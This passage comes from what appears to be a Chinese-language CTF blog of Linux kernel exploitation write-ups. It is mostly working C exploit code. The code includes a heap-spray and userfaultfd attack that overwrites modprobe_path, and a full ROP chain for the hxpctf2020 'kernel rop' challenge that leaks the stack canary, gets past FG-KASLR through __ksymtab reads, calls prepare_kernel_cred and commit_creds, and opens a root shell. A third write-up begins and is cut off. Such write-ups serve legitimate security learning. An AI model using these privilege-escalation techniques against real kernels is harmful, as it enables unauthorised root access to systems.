class="number">-1</span>, <span class="number">0</span>); <span class="comment">//for edit msg-&gt;m_ts</span></span><br><span class="line"> </span><br><span class="line">    buf2 = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//for spray the msg_msg and edit msg-&gt;next</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    RegisterUserfault(buf,fault_handler_thread);</span><br><span class="line">    RegisterUserfault(buf2,fault_handler_thread2);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    sem_init(&amp;sem_addmsg,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_editmsg,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;edit_heap_next,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_edit_msg_for_modpath,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;edit_down,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add(<span class="string">&quot;TEST_chunk&quot;</span>);</span><br><span class="line">    pthread_create(&amp;<span class="type">edit_t</span>,<span class="literal">NULL</span>,UAF,<span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;<span class="type">edit2_t</span>,<span class="literal">NULL</span>,UAF2,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    GREEN <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Write in!&quot;</span>)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">for</span> <span class="params">(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;failed to create pipe!&quot;</span>)</span>; CLOSE</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;_Lotus_&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;failed to write the pipe!&quot;</span>)</span>; CLOSE</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*] pipe_buffer spraying finish.&quot;</span>)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">memset</span><span class="params">(tmp_buf, <span class="number">0</span>, <span class="number">0x1000</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span>(peekMsg(ms_qid[<span class="number">0</span>],tmp_buf,<span class="number">0xe00</span>,<span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Leak error!&quot;</span>)</span>; CLOSE</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// leak(tmp_buf,0xd00);</span></span><br><span class="line">    kernel_base = tmp_buf[<span class="number">0x7e8</span>/<span class="number">8</span>]<span class="number">-0x103ed80</span>;</span><br><span class="line">    <span class="type">size_t</span> pipe_addr =  tmp_buf[<span class="number">0x3e0</span>/<span class="number">8</span>]+<span class="number">0xc00</span>;</span><br><span class="line">    BLUE <span class="title function_">printf</span><span class="params">(<span class="string">&quot;[*]Kernel_base: 0x%llx\n&quot;</span>,kernel_base)</span>; CLOSE</span><br><span class="line">    BLUE <span class="title function_">printf</span><span class="params">(<span class="string">&quot;[*]pipe_addr: 0x%llx\n&quot;</span>,pipe_addr)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">close</span><span class="params">(pipe_fd[<span class="number">0</span>][<span class="number">0</span>])</span>;</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// size_t push_rsi_pop_rsp = real(0xffffffff81934056);//push rsi; pop rsp; retf;</span></span><br><span class="line">    <span class="comment">// size_t push_rsi_pop_rbp = real(0xffffffff81422d1f);//push rsi; pop rbp; ret;</span></span><br><span class="line">    <span class="comment">// size_t call_rsi_leave_ret = real(0xffffffff81c0114d);//call rsi; nop; nop; nop; leave; ret;</span></span><br><span class="line">    <span class="type">size_t</span> modprobe_path = real(<span class="number">0xffffffff82a6c000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_ops_buf, <span class="number">0x61</span>,<span class="number">0x800</span>);</span><br><span class="line"> </span><br><span class="line">    fake_ops_buf[<span class="number">0x200</span>/<span class="number">8</span>] = modprobe_path<span class="number">-0xc0</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add(<span class="string">&quot;Lotus_chunk&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x208</span>,buf2);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> modprobe_path_buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(modprobe_path_buf,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0x34</span>;</span><br><span class="line">    modprobe_path_buf[idx++]=real(<span class="number">0xffffffff82a6c108</span>);</span><br><span class="line">    modprobe_path_buf[idx++]=real(<span class="number">0xffffffff82a6c108</span>);</span><br><span class="line">    modprobe_path_buf[idx++]=<span class="number">0x32</span>;</span><br><span class="line"> </span><br><span class="line">    modprobe_path_buf[<span class="number">0</span>]=<span class="number">0xdeadbeef</span>;</span><br><span class="line"> </span><br><span class="line">    modprobe_path_buf[<span class="number">0x13</span>]=<span class="number">0x746f4c2f706d742f</span>;</span><br><span class="line">    modprobe_path_buf[<span class="number">0x14</span>]=<span class="number">0x68732e7375</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> ret = msgsnd(ms_qid[i], modprobe_path_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]edit modprobe_path success.&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">modprobe_path_hijack</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hxpctf2020-kernel-rop"><a href="#hxpctf2020-kernel-rop" class="headerlink" title="hxpctf2020-kernel rop"></a>hxpctf2020-kernel rop</h2><p>这题本身没什么东西,就是直接贴脸的栈溢出</p><p>不过比较不同的是开启了fgkaslr保护,这个还是第一次遇到,于是单独记录一下</p><p>题目常规保护smap,smep,kaslr,kpti基本都开了</p><p>模块也没什么好分析的</p><p>注册了read和wrtie,然后就是十分明显的栈溢出</p><p>要按照往常的思路,直接泄露canary和text段,然后直接rop提权就行了,</p><p>但是因为fgkaslr的存在,我们的利用多了不少限制</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>首先就是泄露canary,然后我们需要在栈上找一个位于<code>.text</code>区的地址</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-29_104342.png" alt=""></p><p>使用该地址得到内核的基址</p><p>然后<strong>就可以使用<code>.text</code>节区的gadget</strong>了,此时可以去修改<code>modprobe_path</code>,亦或者进一步得到<code>commit_creds</code>和<code>prerpare_kernel_cred</code></p><p>要得到被随机化的函数指针,首先因为已经泄露了内核基址,所以完全可以得到<code>__ksymtab_func_name</code></p><p>然后再利用如下这样的gadget,并辅以一些内联汇编,完全可以得到函数随机化后的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81004d11: pop rax; ret; [0x4d11]</span><br><span class="line">0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]</span><br></pre></td></tr></table></figure><p>如果选择修改<code>modprobe_path</code>的话,就需要找到一些可以<code>mov [reg],reg</code>这样的寄存器修改<code>modprobe_path</code>内存变量</p><p>之后就是常规做法了</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_stack</span><span class="params">(<span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span> *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_commit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_prep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">make_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fetch;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> commit_creds, prepare_kcred, ksymtab_commit_creds, ksymtab_prepare_kcred;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> canary, image_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> cred_struct_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//arbitrary read gadgets</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rax; <span class="comment">//pop rax ; ret</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mov_eax_pop; <span class="comment">//mov eax, dword ptr [rax] ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//other gadgets</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> kpti_trampoline; <span class="comment">//followed by 2 pops</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rdi;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Leaking Stack...\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> size = <span class="number">50</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> buf[size];</span><br><span class="line">leak_stack(size, buf);</span><br><span class="line"></span><br><span class="line">canary = buf[<span class="number">16</span>];</span><br><span class="line">image_base = buf[<span class="number">38</span>]<span class="number">-0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Canary: %lx\n&quot;</span>, canary);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Image Base: %lx\n&quot;</span>, image_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = image_base + <span class="number">0x4d11</span>;</span><br><span class="line">mov_eax_pop = image_base + <span class="number">0x15a80</span>;</span><br><span class="line">kpti_trampoline = image_base + <span class="number">0x200f26</span>;</span><br><span class="line"></span><br><span class="line">ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>;</span><br><span class="line">ksymtab_prepare_kcred = image_base + <span class="number">0xf8d4fc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//leak commit_creds</span></span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rax;</span><br><span class="line">payload[offset++] = ksymtab_commit_creds;</span><br><span class="line">payload[offset++] = mov_eax_pop;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_commit;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_stack</span><span class="params">(<span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">long</span> * buf)</span></span><br><span class="line">&#123;</span><br><span class="line">read(fd, buf, size*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%d]: %lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line"><span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line"><span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;pushf;&quot;</span></span><br><span class="line"><span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]State Saved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_commit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov fetch, eax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line">commit_creds = ksymtab_commit_creds + fetch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]commit_creds() Leaked: %lx\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">leak_prep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prep</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rax;</span><br><span class="line">payload[offset++] = ksymtab_prepare_kcred;</span><br><span class="line">payload[offset++] = mov_eax_pop;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_prep;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_prep</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov fetch, eax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line">prepare_kcred = ksymtab_prepare_kcred + fetch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]prepare_kernel_cred() Leaked: %lx\n&quot;</span>, prepare_kcred);</span><br><span class="line"></span><br><span class="line">make_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">make_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line">pop_rdi = image_base + <span class="number">0x6370</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rdi;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = prepare_kcred;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_cred;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov cred_struct_ptr, rax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]ptr to cred struct retrieved: %lx\n&quot;</span>, cred_struct_ptr);</span><br><span class="line"></span><br><span class="line">send_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rdi;</span><br><span class="line">payload[offset++] = cred_struct_ptr;</span><br><span class="line">payload[offset++] = commit_creds;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)getshell;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Exploit Success!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]Exploit Unsuccessful.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ImaginaryCTF2023-opportunity"><a href="#ImaginaryCTF2023-opportunity" class="headerlink" title="ImaginaryCTF2023-opportunity"></a>ImaginaryCTF2023-opportunity</h2><p>照样保护全开</p><p>然后模块中注册的函数中看起来有问题的只有ioctl和write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 